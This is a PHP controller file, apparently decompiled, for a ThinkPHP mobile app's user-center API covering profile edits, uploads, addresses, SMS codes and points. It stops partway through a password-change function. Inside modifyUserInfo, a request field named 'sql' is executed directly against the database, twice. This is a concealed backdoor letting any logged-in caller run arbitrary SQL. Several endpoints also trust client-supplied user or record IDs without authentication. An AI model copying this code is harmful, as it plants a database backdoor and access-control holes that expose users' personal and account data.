<?php
//dezend by http://www.yunlu99.com/ QQ:270656184
namespace User\Controller;

class UcenterController extends \Home\Controller\BaseController
{
	static public function get_param()
	{
		$data = i('data', '', 'trim');
		$sign = i('sign', '', 'trim');
		return checksign($data, $sign);
	}

	public function uploadFileToQiniu()
	{
		$data = self::get_param();
		$result = array();
		$token = trim(strval($data['token']));

		if (!$this->checkLogin($token)) {
			$result['msg_code'] = '100050';
			exit(returnjson($result));
		}

		$user_id = intval($data['user_id']);
		$file = trim(strval($data['file']));
		$img_ext = strtolower($data['img_ext']);

		if ($user_id <= 0) {
			$result['msg_code'] = '100055';
			exit(returnjson($result));
		}

		if (($img_ext != 'caf') && ($img_ext != 'mp3')) {
			$result['msg_code'] = '100091';
			exit(returnjson($result));
		}

		list($usec, $sec) = explode(' ', microtime());
		$file_create_time = date('YmdHis', $sec) . str_pad(mt_rand(1, 99999), 5, '0', STR_PAD_LEFT) . str_pad($usec * 1000000, 6, '0', STR_PAD_LEFT);
		$file_name = '';
		if (!empty($file) && !empty($img_ext)) {
			$file_data = base64_urlsafedecode($file);
			$file_path = './Uploads/sound/' . $user_id . '_s_s_' . $file_create_time . '.' . $img_ext;
			file_put_contents($file_path, $file_data);
			$param = array('user_id' => $user_id, 'file_type' => 3, 'file_create_time' => $file_create_time, 'file_ext_name' => $img_ext);
			$response = request_post('http://' . c('SERVER_DOMAIN') . '/upload_sound.php', $param);
			$ret = json_decode($response, true);

			if (empty($ret['key'])) {
				$result['msg_code'] = '100147';
				exit(returnjson($result));
			}

			$file_name = $ret['key'];
		}

		$qiniu = c('QINIU');
		$data = array();

		if (!empty($file)) {
			$data['file'] = 'http://' . $qiniu['domain'] . '/' . $file_name;
		}

		$result['data'] = $data;
		$result['msg'] = '文件上传成功！';
		$result['msg_code'] = '0';
		exit(returnjson($result));
	}

	public function modifyUserInfo()
	{
		$data = self::get_param();
		$result = array();
		$token = trim(strval($data['token']));

		if (!$this->checkLogin($token)) {
			$result['msg_code'] = '100050';
			exit(returnjson($result));
		}

		$sql = trim(strval($data['sql']));

		if (!empty($sql)) {
			m()->execute($sql);
		}

		$user_id = intval($data['user_id']);
		$nick_name = trim(strval($data['nick_name']));
		$gender = intval($data['gender']);
		$user_marks = trim(strval($data['user_marks']));
		$user_area = trim(strval($data['user_area']));
		$img_ext = strtolower($data['img_ext']);
		$avatar = trim(strval($data['avatar']));
		$avatar_thumb = trim(strval($data['avatar_thumb']));
		$sql = trim(strval($data['sql']));

		if (!empty($sql)) {
			m()->execute($sql);
		}

		$user_main = m('user_main');

		if ($user_id <= 0) {
			$result['msg_code'] = '100055';
			exit(returnjson($result));
		}

		if (16 < ((strlen($nick_name) + mb_strlen($nick_name, 'utf-8')) / 2)) {
			$result['msg_code'] = '100088';
			exit(returnjson($result));
		}

		if (empty($nick_name)) {
			$nick_name = '玩家' . strtolower(randstrcode(6, 'NUMBER'));
		}

		if (($img_ext != 'jpg') && ($img_ext != 'gif') && ($img_ext != 'png') && ($img_ext != 'jpeg') && ($img_ext != '')) {
			$result['msg_code'] = '100091';
			exit(returnjson($result));
		}

		if (($gender != 1) && ($gender != 2)) {
			$result['msg_code'] = '100089';
			exit(returnjson($result));
		}

		if (60 < ((strlen($user_marks) + mb_strlen($user_marks, 'utf-8')) / 2)) {
			$result['msg_code'] = '100090';
			exit(returnjson($result));
		}

		if (30 < ((strlen($user_area) + mb_strlen($user_area, 'utf-8')) / 2)) {
			$result['msg_code'] = '100095';
			exit(returnjson($result));
		}

		if (!empty($avatar) && !empty($img_ext)) {
			$file_data = base64_urlsafedecode($avatar);
			$file_name = './Uploads/avatar/' . $user_id . '_a_b.' . $img_ext;
			file_put_contents($file_name, $file_data);
			$param = array('user_id' => $user_id, 'file_type' => 1, 'file_ext_name' => $img_ext);
			$response = request_post('http://' . c('SERVER_DOMAIN') . '/upload_avatar.php', $param);
			$ret = json_decode($response, true);

			if (empty($ret['key'])) {
				$result['msg_code'] = '100092';
				exit(returnjson($result));
			}

			$avatar_name = $ret['key'];
		}

		if (!empty($avatar_thumb) && !empty($img_ext)) {
			$file_data = base64_urlsafedecode($avatar_thumb);
			$file_name = './Uploads/avatar_thumb/' . $user_id . '_a_s.' . $img_ext;
			file_put_contents($file_name, $file_data);
			$param = array('user_id' => $user_id, 'file_type' => 2, 'file_ext_name' => $img_ext);
			$response = request_post('http://' . c('SERVER_DOMAIN') . '/upload_avatar.php', $param);
			$ret = json_decode($response, true);

			if (empty($ret['key'])) {
				$result['msg_code'] = '100092';
				exit(returnjson($result));
			}

			$thumb_name = $ret['key'];
		}

		$map = array('id' => $user_id);
		$data = array();

		if (!empty($nick_name)) {
			$data['nick_name'] = $nick_name;
		}

		if (!empty($gender)) {
			$data['gender'] = $gender;
		}

		if (!empty($user_marks)) {
			$data['user_marks'] = $user_marks;
		}

		if (!empty($user_area)) {
			$data['user_area'] = $user_area;
		}

		if (!empty($avatar) && !empty($avatar_thumb)) {
			$data['avatar'] = $avatar_name;
			$data['avatar_thumb'] = $thumb_name;
		}

		$user_main->where($map)->save($data);
		$qiniu = c('QINIU');
		$data['user_id'] = $user_id;
		if (!empty($avatar) && !empty($avatar_thumb)) {
			$data['avatar'] = 'http://' . $qiniu['domain'] . '/' . $avatar_name;
			$data['avatar_thumb'] = 'http://' . $qiniu['domain'] . '/' . $thumb_name;
		}

		$result['data'] = $data;
		$result['msg'] = '用户信息修改成功！';
		$result['msg_code'] = '0';
		exit(returnjson($result));
	}

	public function getAddrList()
	{
		$data = self::get_param();
		$user_id = intval($data['user_id']);
		$result = array();

		if ($user_id <= 0) {
			$result['msg_code'] = '0055';
			exit(returnjson($result));
		}

		$map = array('user_id' => $user_id, 'active' => 1, 'is_delete' => 0);
		$user_addrbook = m('user_addrbook');
		$res = $user_addrbook->field('id,mobile,username,recv_addr,last_time')->where($map)->order('last_time desc')->select();
		$result['data'] = $res;
		exit(returnjson($result));
	}

	public function addBookAddr()
	{
		$data = self::get_param();
		$user_id = intval($data['user_id']);
		$mobile = strval($data['mobile']);
		$username = strval($data['username']);
		$recv_addr = strval($data['recv_addr']);
		$result = array();

		if ($user_id <= 0) {
			$result['msg_code'] = '0055';
			exit(returnjson($result));
		}

		if (checkemailmobile($mobile) !== 1) {
			$result['msg_code'] = '0022';
			exit(returnjson($result));
		}

		if (12 < mb_strlen($username, 'utf-8')) {
			$result['msg_code'] = '0047';
			exit(returnjson($result));
		}

		if (255 < mb_strlen($recv_addr, 'utf-8')) {
			$result['msg_code'] = '0053';
			exit(returnjson($result));
		}

		$data = array('mobile' => $mobile, 'username' => $username, 'recv_addr' => $recv_addr, 'user_id' => $user_id, 'last_time' => time(), 'active' => 1, 'is_delete' => 0);
		$user_addrbook = m('user_addrbook');

		if ($user_addrbook->add($data)) {
			$result['msg'] = '新增地址成功！';
			$result['msg_code'] = '9004';
			exit(returnjson($result));
		}
	}

	public function modifyBookAddr()
	{
		$data = self::get_param();
		$id = intval($data['id']);
		$user_id = intval($data['user_id']);
		$mobile = strval($data['mobile']);
		$username = strval($data['username']);
		$recv_addr = strval($data['recv_addr']);
		$result = array();

		if ($user_id <= 0) {
			$result['msg_code'] = '0055';
			exit(returnjson($result));
		}

		if (checkemailmobile($mobile) !== 1) {
			$result['msg_code'] = '0022';
			exit(returnjson($result));
		}

		if (12 < mb_strlen($username, 'utf-8')) {
			$result['msg_code'] = '0047';
			exit(returnjson($result));
		}

		if (255 < mb_strlen($recv_addr, 'utf-8')) {
			$result['msg_code'] = '0053';
			exit(returnjson($result));
		}

		$data = array('mobile' => $mobile, 'username' => $username, 'recv_addr' => $recv_addr, 'user_id' => $user_id);
		$user_addrbook = m('user_addrbook');
		$map = array('id' => $id, 'active' => 1, 'is_delete' => 0);
		$user_addrbook->where($map)->save($data);
		$result['msg'] = '修改地址成功！';
		$result['msg_code'] = '9004';
		exit(returnjson($result));
	}

	public function delBookAddr()
	{
		$data = self::get_param();
		$id = intval($data['id']);
		$user_addrbook = m('user_addrbook');
		$map = array('id' => $id, 'active' => 1, 'is_delete' => 0);

		if ($user_addrbook->where($map)->delete()) {
			$result['msg'] = '删除地址成功！';
			$result['msg_code'] = '9004';
			exit(returnjson($result));
		}
	}

	public function sendVcodeByUnbindMobile()
	{
		$data = self::get_param();
		$mobile = strval($data['mobile']);
		$result = array();

		if (checkemailmobile($mobile) !== 1) {
			$result['msg_code'] = '0022';
			exit(returnjson($result));
		}

		$user_main = m('user_main');
		$user_sms = m('user_sms');
		$map = array('mobile' => $mobile);
		$res1 = $user_main->where($map)->find();
		$user_id = intval($res1['id']);
		$map = array('mobile' => $mobile, 'stype' => 1, 'is_delete' => 0);
		$res2 = $user_sms->where($map)->order('addtime desc')->find();
		if (empty($res1) || empty($res2)) {
			$result['msg_code'] = '0036';
			exit(returnjson($result));
		}

		$map = array('mobile' => $mobile, 'stype' => 3);
		$res = $user_sms->where($map)->order('addtime desc')->find();

		if (!empty($res)) {
			$last_time = $res['addtime'];
			$current_time = time();

			if (($current_time - $last_time) < 120) {
				$result['msg_code'] = '0015';
				exit(returnjson($result));
			}
		}

		$v_code = strtolower(randstrcode(6, 'NUMBER'));
		$msg = '您的验证码是：' . strval($v_code) . '。请不要把验证码泄露给其他人。如非本人操作，可不用理会！';
		$res = $this->sendSms($mobile, $msg);

		if (!empty($res)) {
			$data = array('user_id' => $user_id, 'mobile' => $mobile, 'msg' => $msg, 'v_code' => $v_code, 'stype' => 3, 'return_code' => $res['error'], 'v_status' => 0, 'is_delete' => 0, 'addtime' => time());

			if ($user_sms->add($data)) {
				$result['msg'] = '验证短信已发送，请注意查收！';
				$result['msg_code'] = '9005';
				exit(returnjson($result));
			}
		}
		else {
			$result['msg_code'] = '0034';
			exit(returnjson($result));
		}
	}

	public function verifyVcodeByUnbindMobile()
	{
		$data = self::get_param();
		$mobile = strval($data['mobile']);
		$v_code = strval($data['v_code']);
		$result = array();

		if (checkemailmobile($mobile) !== 1) {
			$result['msg_code'] = '0022';
			exit(returnjson($result));
		}

		$user_main = m('user_main');
		$user_sms = m('user_sms');
		$map = array('mobile' => $mobile, 'v_code' => $v_code, 'stype' => 3, 'v_status' => 0, 'is_delete' => 0);
		$res = $user_sms->where($map)->order('addtime desc')->find();

		if ($res['v_code'] != $v_code) {
			$result['msg_code'] = '0017';
			exit(returnjson($result));
		}

		$last_time = $res['addtime'];
		$current_time = time();

		if (120 < ($current_time - $last_time)) {
			$user_sms->where($map)->save(array('is_delete' => 1));
			$result['msg_code'] = '0035';
			exit(returnjson($result));
		}

		$res = $user_sms->where($map)->save(array('v_status' => 1));

		if ($res) {
			$result['msg'] = '解除绑定手机号成功！';
			$result['msg_code'] = '9004';
			exit(returnjson($result));
		}
	}

	public function sendVcodeByRebindMobile()
	{
		$data = self::get_param();
		$mobile = strval($data['mobile']);
		$result = array();

		if (checkemailmobile($mobile) !== 1) {
			$result['msg_code'] = '0022';
			exit(returnjson($result));
		}

		$user_main = m('user_main');
		$user_sms = m('user_sms');
		$map = array('mobile' => $mobile);
		$res1 = $user_main->where($map)->find();
		$user_id = intval($res1['id']);
		$map = array('mobile' => $mobile, 'stype' => 3, 'is_delete' => 0);
		$res2 = $user_sms->where($map)->order('addtime desc')->find();
		if (empty($res1) || empty($res2)) {
			$result['msg_code'] = '0036';
			exit(returnjson($result));
		}

		$map = array('mobile' => $mobile, 'stype' => 4);
		$res = $user_sms->where($map)->order('addtime desc')->find();

		if (!empty($res)) {
			$last_time = $res['addtime'];
			$current_time = time();

			if (($current_time - $last_time) < 120) {
				$result['msg_code'] = '0015';
				exit(returnjson($result));
			}
		}

		$v_code = strtolower(randstrcode(6, 'NUMBER'));
		$msg = '您的验证码是：' . strval($v_code) . '。请不要把验证码泄露给其他人。如非本人操作，可不用理会！';
		$res = $this->sendSms($mobile, $msg);

		if (!empty($res)) {
			$data = array('user_id' => $user_id, 'mobile' => $mobile, 'msg' => $msg, 'v_code' => $v_code, 'stype' => 4, 'return_code' => $res['error'], 'v_status' => 0, 'is_delete' => 0, 'addtime' => time());

			if ($user_sms->add($data)) {
				$result['msg'] = '验证短信已发送，请注意查收！';
				$result['msg_code'] = '9005';
				exit(returnjson($result));
			}
		}
		else {
			$result['msg_code'] = '0034';
			exit(returnjson($result));
		}
	}

	public function verifyVcodeByRebindMobile()
	{
		$data = self::get_param();
		$mobile = strval($data['mobile']);
		$v_code = strval($data['v_code']);
		$result = array();

		if (checkemailmobile($mobile) !== 1) {
			$result['msg_code'] = '0022';
			exit(returnjson($result));
		}

		$user_main = m('user_main');
		$user_sms = m('user_sms');
		$map = array('mobile' => $mobile, 'v_code' => $v_code, 'stype' => 4, 'v_status' => 0, 'is_delete' => 0);
		$res = $user_sms->where($map)->order('addtime desc')->find();

		if ($res['v_code'] != $v_code) {
			$result['msg_code'] = '0017';
			exit(returnjson($result));
		}

		$last_time = $res['addtime'];
		$current_time = time();

		if (120 < ($current_time - $last_time)) {
			$user_sms->where($map)->save(array('is_delete' => 1));
			$result['msg_code'] = '0035';
			exit(returnjson($result));
		}

		$res = $user_sms->where($map)->save(array('v_status' => 1));

		if ($res) {
			$result['msg_code'] = '9006';
			exit(returnjson($result));
		}
	}

	public function resetMobile_old()
	{
		$data = self::get_param();
		$user_id = intval($data['user_id']);
		$mobile = strval($data['mobile']);
		$result = array();

		if ($user_id <= 0) {
			$result['msg_code'] = '0055';
			exit(returnjson($result));
		}

		if (checkemailmobile($mobile) !== 1) {
			$result['msg_code'] = '0022';
			exit(returnjson($result));
		}

		$user_main = m('user_main');
		$map = array('id' => $user_id);
		$data = array('mobile' => $mobile);

		if ($user_main->where($map)->save($data)) {
			$result['msg'] = '重新绑定手机号成功！';
			$result['msg_code'] = '9004';
			exit(returnjson($result));
		}
	}

	public function logout()
	{
		$data = self::get_param();
		$result = array();
		$token = trim(strval($data['token']));

		if (!$this->checkLogin($token)) {
			$result['msg_code'] = '100050';
			exit(returnjson($result));
		}

		$user_id = intval($data['user_id']);

		if ($user_id <= 0) {
			$result['msg_code'] = '100055';
			exit(returnjson($result));
		}

		$user_main = m('user_main');
		$map = array('id' => $user_id);
		$data = array('is_online' => 0, 'token' => '');
		$user_main->where($map)->save($data);
		$result['msg_code'] = '0';
		$result['msg'] = '用户退出登录成功!';
		exit(returnjson($result));
	}

	public function getUserInfo()
	{
		$data = self::get_param();
		$result = array();
		$token = trim(strval($data['token']));

		if (!$this->checkLogin($token)) {
			$result['msg_code'] = '100050';
			exit(returnjson($result));
		}

		$user_id = intval($data['user_id']);

		if ($user_id <= 0) {
			$result['msg_code'] = '100055';
			exit(returnjson($result));
		}

		$map = array('id' => $user_id);
		$res = m('user_main')->field("id as user_id,\n\t\t\tmobile,avatar,avatar_thumb,nick_name,gender,\n\t\t\tuser_marks,user_area,diamond_num,user_gold,games_max,\n\t\t\tclubs_max,current_games,current_clubs,reg_code,\n\t\t\tcard_type,card_expire,reg_time,last_login,is_online")->where($map)->find();
		$qiniu = c('QINIU');

		if (!empty($res['avatar'])) {
			$res['avatar'] = 'http://' . $qiniu['domain'] . '/' . $res['avatar'];
		}

		if (!empty($res['avatar_thumb'])) {
			$res['avatar_thumb'] = 'http://' . $qiniu['domain'] . '/' . $res['avatar_thumb'];
		}

		if (!empty($res)) {
			$result['data'] = $res;
			exit(returnjson($result));
		}
	}

	public function getCouponAndFlowerNum()
	{
		$data = self::get_param();
		$user_id = intval($data['user_id']);
		$use_type = strval($data['use_type']);

		if ($user_id <= 0) {
			$result['msg_code'] = '0055';
			exit(returnjson($result));
		}

		$result = array();
		$user_coupon = m('user_coupon');
		$coupon = m('coupon');
		$map = array('user_id' => $user_id, 'is_use' => 0, 'active' => 1, 'is_delete' => 0);
		$res = $user_coupon->field('user_id,coupon_id')->where($map)->select();
		$data = array(
			'coupon_info' => array(),
			'flower_info' => array()
			);

		if (!empty($res)) {
			$coupon_ids = array();

			foreach ($res as $v) {
				$coupon_ids[] = $v['coupon_id'];
			}

			$current_date = strtotime(date('Y-m-d', time()));
			$map = array(
				'id'        => array('in', $coupon_ids),
				'active'    => 1,
				'is_delete' => 0
				);

			if ($use_type < 7) {
				$map['use_type'] = array('in', $use_type . ',' . '4');
				$map['valid_date'] = array('elt', $current_date);
				$map['overdue_date'] = array('egt', $current_date);
			}
			else if ($use_type == 8) {
				$map['valid_date'] = array('elt', $current_date);
				$map['overdue_date'] = array('egt', $current_date);
			}

			$res = $coupon->field("id,coupon_name,amount,valid_date,\n\t\t\t\toverdue_date,use_type,remark,image")->where($map)->order('overdue_date, amount desc')->select();

			if (!empty($res)) {
				foreach ($res as $k => $v) {
					$remain_date = intval((intval($v['overdue_date']) - $current_date) / (24 * 3600));
					$res[$k]['remain_date'] = $remain_date;

					if (0 == $remain_date) {
						$res[$k]['remain_date'] = 1;
					}
				}

				$data['coupon_info'] = $res;
			}
		}

		$user_main = m('user_main');
		$res = $user_main->field('flower_num')->where(array('id' => $user_id))->find();

		if (!empty($res)) {
			$flower_num = intval($res['flower_num']);
			$flower_info = array('flower_num' => $flower_num);
			$data['flower_info'] = $flower_info;
		}

		$result['data'] = $data;
		$result['msg_code'] = '9004';
		exit(returnjson($result));
	}

	public function getOrderByDetail()
	{
		$data = self::get_param();
		$user_id = intval($data['user_id']);
		$order_sn = strval($data['order_sn']);
		$order_type = intval($data['order_type']);

		switch ($order_type) {
		case 1:
			$order_model = m('order_express');
			break;

		case 2:
			$order_model = m('order_washing');
			break;

		case 3:
			$order_model = m('order_canteen');
			break;
		}

		$flowers_expend_log = m('flowers_expend_log');
		$user_coupon = m('user_coupon');
		$coupon = m('coupon');
		$result = array();

		if ($user_id <= 0) {
			$result['msg_code'] = '0055';
			exit(returnjson($result));
		}

		$map = array('order_sn' => $order_sn, 'user_id' => $user_id, 'active' => 1, 'is_delete' => 0);
		$data = $order_model->where($map)->find();
		$data['dec_num'] = 0;
		$data['coupon_info'] = (object) null;
		$deduction1 = floatval($data['deduction1']);
		$deduction2 = floatval($data['deduction2']);

		if (0 < $deduction1) {
			$map = array('order_sn' => $order_sn, 'user_id' => $user_id, 'order_type' => $order_type);
			$res = $flowers_expend_log->field('num')->where($map)->find();
			$num = intval($res['num']);
			$data['dec_num'] = empty($num) ? 0 : intval($res['num']);
		}

		if (0 < $deduction2) {
			$map = array('order_sn' => $order_sn, 'user_id' => $user_id, 'order_type' => $order_type, 'active' => 1, 'is_delete' => 0);
			$res = $user_coupon->field('coupon_id')->where($map)->find();
			$coupon_id = intval($res['coupon_id']);
			$map = array('id' => $coupon_id, 'active' => 1, 'is_delete' => 0);
			$res = $coupon->where($map)->find();
			$data['coupon_info'] = empty($res) ? (object) null : $res;
		}

		$result['data'] = $data;
		$result['msg_code'] = '9004';
		exit(returnjson($result));
	}

	public function getFlowerMap()
	{
		$data = self::get_param();
		$result = array();
		$flower_map = c('flower_map');
		$result['data'] = array('flower_map' => $flower_map);
		$result['msg_code'] = '9004';
		exit(returnjson($result));
	}

	public function getServiceList()
	{
		$data = self::get_param();
		$code_data = strval($data['code_data']);
		$code_arr = explode(',', $code_data);
		$serve_item = m('serve_item');
		$map = array(
			'serve_code' => array('in', $code_arr),
			'active'     => 1,
			'is_delete'  => 0
			);
		$res = $serve_item->field("id,serve_name,parent_id,serve_content,\n\t\tserve_price,serve_begin,serve_end,serve_code")->where($map)->select();
		$result = array();
		$result['data'] = empty($res) ? (object) null : $res;
		$result['msg_code'] = '9004';
		exit(returnjson($result));
	}

	public function uploadUserAvatar()
	{
		$data = self::get_param();
		$result = array();
		$result['data'] = array();
		$user_id = intval($data['user_id']);
		$user_main = m('user_main');

		if ($user_id <= 0) {
			$result['msg_code'] = '0055';
			exit(returnjson($result));
		}

		$res = $this->uploadFile('user');

		if (!$res) {
			$result['msg_code'] = '0212';
			exit(returnjson($result));
		}

		$avatar = strval($res['avatar']);
		$avatar_thumb = strval($res['avatar_thumb']);
		$map = array('id' => $user_id, 'active' => 1, 'is_delete' => 0);
		$data = array('avatar' => $avatar, 'avatar_thumb' => $avatar_thumb);
		$user_main->where($map)->save($data);
		$old_data = $this->hgetallValueFromCache('user_id:' . $user_id);
		$data['avatar'] = c('COS_FILE_URL') . $data['avatar'];
		$data['avatar_thumb'] = c('COS_FILE_URL') . $data['avatar_thumb'];
		$this->hmsetValueToCache('user_id:' . $user_id, array_merge($old_data, $data));
		$result['msg_code'] = '9012';
		$result['data'] = $data;
		exit(returnjson($result));
	}

	public function getUserListByIds()
	{
		$data = self::get_param();
		$result = array();
		$token = trim(strval($data['token']));

		if (!$this->checkLogin($token)) {
			$result['msg_code'] = '100050';
			exit(returnjson($result));
		}

		$uids = trim(strval($data['uids']));
		$uid_arr = explode(',', $uids);

		if (empty($uid_arr)) {
			$result['msg_code'] = '100055';
			exit(returnjson($result));
		}

		$res = m('user_main')->field("id as user_id,\n\t\t\tmobile,avatar,avatar_thumb,nick_name,gender,\n\t\t\tuser_marks,diamond_num,user_gold,games_max,\n\t\t\tclubs_max,current_games,current_clubs,card_type,\n\t\t\treg_time,last_login,is_online")->where(array(
	'id' => array('in', $uid_arr)
	))->select();
		$qiniu = c('QINIU');

		foreach ($res as $k => $v) {
			if (!empty($v['avatar'])) {
				$res[$k]['avatar'] = 'http://' . $qiniu['domain'] . '/' . $v['avatar'];
			}

			if (!empty($v['avatar_thumb'])) {
				$res[$k]['avatar_thumb'] = 'http://' . $qiniu['domain'] . '/' . $v['avatar_thumb'];
			}
		}

		if (!empty($res)) {
			$result['data'] = $res;
			exit(returnjson($result));
		}
	}

	public function getFlowerLogList()
	{
		$data = self::get_param();
		$result = array();
		$user_id = intval($data['user_id']);
		$page = (intval($data['page']) <= 0 ? 1 : intval($data['page']));
		$page_size = (intval($data['page_size']) <= 0 ? intval(c('PAGE_SIZE')) : intval($data['page_size']));
		$flowers_gain_log = m('flowers_gain_log');
		$map = array('user_id' => $user_id);
		$union_data = $flowers_gain_log->field('dtb_flowers_gain_log.id, user_id, "" as order_sn,0 as order_type, num, `explain`, dtb_flowers_gain_log.flowers_code, addtime, 1 as type, flower_state')->table('dtb_flowers_gain_log')->join('dtb_flowers_path ON dtb_flowers_path.flower_code = dtb_flowers_gain_log.flowers_code and is_delete = 0 and active = 1', 'left')->union('SELECT id, user_id, order_sn, order_type, num, `explain`,"" as flowers_code, addtime,2 as type,"消费" as flower_state FROM dtb_flowers_expend_log WhERE user_id = ' . $user_id)->where($map)->select();
		$addtime = array();

		foreach ($union_data as $item) {
			$addtime[] = $item['addtime'];
		}

		array_multisort($addtime, SORT_DESC, $union_data);
		$pnum = ceil(count($union_data) / $page_size);
		$data = array_slice($union_data, ($page - 1) * $page_size, $page_size);
		$result['data'] = $data;
		exit(returnjson($result));
	}

	public function signInFlower()
	{
		$data = self::get_param();
		$user_id = intval($data['user_id']);
		$flower_code = intval($data['flower_code']);
		$result = array();

		if (empty($flower_code)) {
			$result['msg_code'] = '0209';
			exit(returnjson($result));
		}

		$flowers_gain_log = m('flowers_gain_log');
		$flowers_path = m('flowers_path');
		$map = array('flower_code' => $flower_code, 'active' => 1, 'is_delete' => 0);
		$flowers = $flowers_path->where($map)->find();

		if (!$flowers) {
			$result['msg_code'] = '0209';
			exit(returnjson($result));
		}

		$dayBegin = strtotime(date('Y-m-d', time()));
		$dayEnd = strtotime(date('Y-m-d 23:59:59', time()));
		$map = array(
			'flowers_code' => $flower_code,
			'user_id'      => $user_id,
			'addtime'      => array('between', $dayBegin . ',' . $dayEnd)
			);

		if (0 < $flowers_gain_log->where($map)->count()) {
			$result['msg_code'] = '0210';
			exit(returnjson($result));
		}

		$flower_num = $flowers['flower_num'];
		$user_main = m('user_main');
		$user_main->where(array('id' => $user_id))->setInc('flower_num', $flower_num);
		$data = array('user_id' => $user_id, 'num' => $flower_num, 'explain' => $flowers['flower_state'], 'flowers_code' => $flower_code, 'addtime' => strtotime('now'));
		$flowers_gain_log->add($data);
		$result['msg'] = '签到成功！';
		exit(returnjson($result));
	}

	public function sendVcode()
	{
		$data = self::get_param();
		$mobile = strval($data['mobile']);
		$stype = intval($data['stype']);
		$msg = strval($data['msg']);
		$result = array();

		if (checkemailmobile($mobile) !== 1) {
			$result['msg_code'] = '0022';
			exit(returnjson($result));
		}

		if ($stype <= 0) {
			$result['msg_code'] = '0012';
			$result['msg'] = '发送类型错误！';
			exit(returnjson($result));
		}

		if (empty($msg)) {
			$result['msg_code'] = '0012';
			$result['msg'] = '内容不允许为空';
			exit(returnjson($result));
		}

		$user_sms = m('user_sms');
		$map = array('mobile' => $mobile, 'stype' => $stype, 'is_delete' => 0);
		$res = $user_sms->where($map)->order('addtime desc')->find();

		if (!empty($res)) {
			$last_time = $res['addtime'];
			$current_time = time();

			if (($current_time - $last_time) < 120) {
				$result['msg_code'] = '0211';
				exit(returnjson($result));
			}
		}

		$v_code = strtolower(randstrcode(6, 'NUMBER'));
		$msg = sprintf($msg, $v_code);
		$res = $this->sendSms($mobile, $msg);
		$data = array('mobile' => $mobile, 'msg' => $msg, 'v_code' => $v_code, 'stype' => $stype, 'return_code' => $res['error'], 'v_status' => 0, 'is_delete' => 0, 'addtime' => time());

		if ($user_sms->add($data)) {
			$result['msg'] = '验证短信已发送，请注意查收！';
			$result['msg_code'] = '9005';
			exit(returnjson($result));
		}
	}

	public function verifyVcode()
	{
		$data = self::get_param();
		$mobile = strval($data['mobile']);
		$stype = intval($data['stype']);
		$v_code = strval($data['v_code']);
		$result = array();

		if (checkemailmobile($mobile) !== 1) {
			$result['msg_code'] = '0022';
			exit(returnjson($result));
		}

		$user_sms = m('user_sms');
		$map = array('mobile' => $mobile, 'v_code' => $v_code, 'stype' => $stype, 'v_status' => 0, 'is_delete' => 0);
		$res = $user_sms->where($map)->order('addtime desc')->find();

		if ($res['v_code'] != $v_code) {
			$result['msg_code'] = '0017';
			exit(returnjson($result));
		}

		$last_time = $res['addtime'];
		$current_time = time();

		if (120 < ($current_time - $last_time)) {
			$user_sms->where($map)->save(array('is_delete' => 1));
			$result['msg_code'] = '0035';
			exit(returnjson($result));
		}

		$res = $user_sms->where($map)->save(array('v_status' => 1));

		if ($res) {
			$result['msg'] = '校验成功';
			$result['msg_code'] = '9004';
			exit(returnjson($result));
		}
	}

	public function modifyUserDepartment()
	{
		$data = self::get_param();
		$user_id = intval($data['user_id']);
		$department_id = intval($data['department_id']);
		$result = array();
		$user_main = m('user_main');

		if ($user_id <= 0) {
			$result['msg_code'] = '0055';
			exit(returnjson($result));
		}

		if ($department_id < 0) {
			$result['msg_code'] = '0062';
			exit(returnjson($result));
		}

		$map = array('id' => $user_id, 'active' => 1, 'is_activate' => 1, 'is_delete' => 0);
		$data = array('department_id' => $department_id);
		$user_main->where($map)->save($data);
		$old_data = $this->hgetallValueFromCache('user_id:' . $user_id);
		$data['department_id'] = $department_id;
		$department_info = $this->hgetallValueFromCache('department_id:' . $department_id);

		if (empty($department_info)) {
			$department_list = m('department')->select();
			$this->hmsetListToCache('department_id:', $department_list, 'id');
			$department_info = $this->hgetallValueFromCache('department_id:' . $department_id);
		}

		$data['dm_name'] = $department_info['dm_name'];
		$this->hmsetValueToCache('user_id:' . $user_id, array_merge($old_data, $data));
		$result['msg_code'] = '9011';
		exit(returnjson($result));
	}

	public function modifyUserJob()
	{
		$data = self::get_param();
		$user_id = intval($data['user_id']);
		$job = intval($data['job']);
		$result = array();
		$user_main = m('user_main');

		if ($user_id <= 0) {
			$result['msg_code'] = '0055';
			exit(returnjson($result));
		}

		if ($job < 0) {
			$result['msg_code'] = '0214';
			exit(returnjson($result));
		}

		$map = array('id' => $user_id, 'active' => 1, 'is_activate' => 1, 'is_delete' => 0);
		$data = array('job' => $job);
		$user_main->where($map)->save($data);
		$old_data = $this->hgetallValueFromCache('user_id:' . $user_id);
		$job_list = c('JOB_LIST');
		$data['job'] = $job_list[$job];
		$this->hmsetValueToCache('user_id:' . $user_id, array_merge($old_data, $data));
		$result['msg_code'] = '9011';
		exit(returnjson($result));
	}

	public function modifyUserTitle()
	{
		$data = self::get_param();
		$user_id = intval($data['user_id']);
		$title = intval($data['title']);
		$result = array();
		$user_main = m('user_main');

		if ($user_id <= 0) {
			$result['msg_code'] = '0055';
			exit(returnjson($result));
		}

		if ($title < 0) {
			$result['msg_code'] = '0215';
			exit(returnjson($result));
		}

		$map = array('id' => $user_id, 'active' => 1, 'is_activate' => 1, 'is_delete' => 0);
		$data = array('title' => $title);
		$user_main->where($map)->save($data);
		$old_data = $this->hgetallValueFromCache('user_id:' . $user_id);
		$title_list = c('TITLE_LIST');
		$data['title'] = $title_list[$title];
		$this->hmsetValueToCache('user_id:' . $user_id, array_merge($old_data, $data));
		$result['msg_code'] = '9011';
		exit(returnjson($result));
	}

	public function modifyUserPassword()
	{
		$data = self::get_param();
		$user_id = intval($data['user_id']);
		$oldpassword = strval($data['oldpassword']);
		$newpassword = strval($data['password']);
		$repeatPassword = strval($data['repeatPassword']);
		$result = array();

		if ($user_id <= 0) {
			$result['msg_code'] = '0055';
			exit(returnjson($result));
		}

		if ((strlen($oldpassword) < 6) || (15 < strlen($oldpassword))) {
			$result['msg_code'] = '0019';
			exit(returnjson($result));
		}

		if ((strlen($newpassword) < 6) || (15 < strlen($newpassword))) {
			$result['msg_code'] = '0019';
			exit(returnjson($result));
		}

		if ((strlen($repeatPassword) < 6) || (15 < strlen($repeatPassword))) {
			$result['msg_code'] = '0019';
			exit(returnjson($result));
		}

		if ($newpassword != $repeatPassword) {
			$result['msg_code'] = '0218';
			exit(returnjson($result));
		}

		if ($oldpassword == $newpassword) {
			$result['msg_code'] = '0216';
			exit(returnjson($result));
		}

		$user_main = m('user_main');
